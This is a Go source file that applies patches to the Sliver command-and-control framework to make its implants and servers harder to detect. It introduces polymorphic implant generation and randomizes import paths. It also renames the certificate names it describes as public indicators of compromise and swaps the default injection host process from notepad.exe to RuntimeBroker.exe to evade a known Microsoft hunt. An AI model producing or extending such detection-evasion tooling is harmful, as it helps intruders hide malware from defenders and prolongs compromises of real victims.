package sliverfork

import (
	"bytes"
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
)

//go:embed embed/polymorph.go.txt
var polymorphGo []byte

// generatorPatch is a surgical edit to Sliver's implant compiler (the code
// sliver-server uses for exe / shellcode / shared). Applied to a checkout,
// then the operator rebuilds sliver-server. This UI is only a client.
type generatorPatch struct {
	Rel string
	Old string
	New string
	ID  string
}

var generatorPatches = []generatorPatch{
	{
		ID:  "donut-bypass-none",
		Rel: "server/generate/donut.go",
		Old: "\tdefaultDonutBypass   = wasmdonut.DonutBypassContinue",
		New: "\tdefaultDonutBypass   = 1 // none; Continue (3) is Win32/AMSI_Patch",
	},
	{
		ID:  "exports-startw-only",
		Rel: "client/command/generate/commands.go",
		Old: `"StartW,VoidFunc,DllInstall,DllRegisterServer,DllUnregisterServer"`,
		New: `"StartW"`,
	},
	{
		ID:  "inline-max-errors",
		Rel: "implant/sliver/runner/runner.go",
		Old: "transports.GetMaxConnectionErrors()",
		New: "{{.Config.MaxConnectionErrors}}",
	},
	{
		ID:  "rpc-polymorph-generate",
		Rel: "server/rpc/rpc-generate.go",
		Old: "\tif len(config.Exports) == 0 {\n\t\tconfig.Exports = []string{\"StartW\"}\n\t}",
		New: "\tgenerate.PolymorphConfig(config)",
	},
	{
		ID:  "rpc-polymorph-stage",
		Rel: "server/rpc/rpc-generate.go",
		Old: "\tif len(profile.Config.Exports) == 0 {\n\t\tprofile.Config.Exports = []string{\"StartW\"}\n\t}",
		New: "\tgenerate.PolymorphConfig(profile.Config)",
	},
	{
		ID:  "random-import-disguise",
		Rel: "server/generate/binaries.go",
		Old: "\t\tnewImportPrefix := path.Join(modResult.NewModule, \"runc\", \"cgroup\")",
		New: "\t\tnewImportPrefix := path.Join(modResult.NewModule, randomPathSeg(), randomPathSeg())",
	},
	// Public TLS IOCs (new installs only; existing ~/.sliver CAs are not rotated).
	// Stock v1.7.3 Old strings; same length so in-place rewrite stays aligned.
	{
		ID:  "ca-cn-workgroup",
		Rel: "server/certs/ca.go",
		Old: `GenerateCertificateAuthority(OperatorCA, "operators")`,
		New: `GenerateCertificateAuthority(OperatorCA, "workgroup")`,
	},
	{
		ID:  "mtls-cn-application",
		Rel: "server/transport/mtls.go",
		Old: `getOperatorServerTLSConfig("multiplayer")`,
		New: `getOperatorServerTLSConfig("application")`,
	},
	{
		ID:  "tailscale-cn-application",
		Rel: "server/transport/tailscale.go",
		Old: `getOperatorServerTLSConfig("multiplayer")`,
		New: `getOperatorServerTLSConfig("application")`,
	},
	// Microsoft 2022 hunt: default sacrificial notepad.exe host process.
	// CLI flag defaults only; CRT inject sequence is unchanged.
	{
		ID:  "exec-host-notepad",
		Rel: "client/command/exec/commands.go",
		Old: `"notepad.exe"`,
		New: `"RuntimeBroker.exe"`,
	},
	{
		ID:  "exec-host-notepad-path",
		Rel: "client/command/exec/commands.go",
		Old: "`c:\\windows\\system32\\notepad.exe`",
		New: "`c:\\windows\\system32\\RuntimeBroker.exe`",
	},
	{
		ID:  "alias-windows-host",
		Rel: "client/command/alias/load.go",
		Old: "windowsDefaultHostProc = `c:\\windows\\system32\\notepad.exe`",
		New: "windowsDefaultHostProc = `c:\\windows\\system32\\RuntimeBroker.exe`",
	},
}

func applyGeneratorPatches(root string, dry bool, hits map[string]int) (changed []string, err error) {
	polyRel := filepath.FromSlash("server/generate/polymorph.go")
	polyPath := filepath.Join(root, polyRel)
	if _, err := os.Stat(polyPath); err != nil {
		hits["polymorph.go"]++
		changed = append(changed, "server/generate/polymorph.go")
		if !dry {
			if err := os.MkdirAll(filepath.Dir(polyPath), 0o755); err != nil {
				return changed, err
			}
			if err := os.WriteFile(polyPath, polymorphGo, 0o644); err != nil {
				return changed, err
			}
		}
	} else {
		hits["polymorph.go(already)"]++
	}
	for _, p := range generatorPatches {
		path := filepath.Join(root, filepath.FromSlash(p.Rel))
		raw, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		old := []byte(p.Old)
		if !bytes.Contains(raw, old) {
			if bytes.Contains(raw, []byte(p.New)) {
				hits[p.ID+"(already)"]++
			}
			continue
		}
		n := bytes.Count(raw, old)
		next := bytes.ReplaceAll(raw, old, []byte(p.New))
		hits[p.ID] += n
		rel := p.Rel
		changed = append(changed, rel)
		if dry {
			continue
		}
		st, err := os.Stat(path)
		if err != nil {
			return changed, err
		}
		if err := os.WriteFile(path, next, st.Mode().Perm()); err != nil {
			return changed, fmt.Errorf("%s: %w", rel, err)
		}
	}
	return changed, nil
}
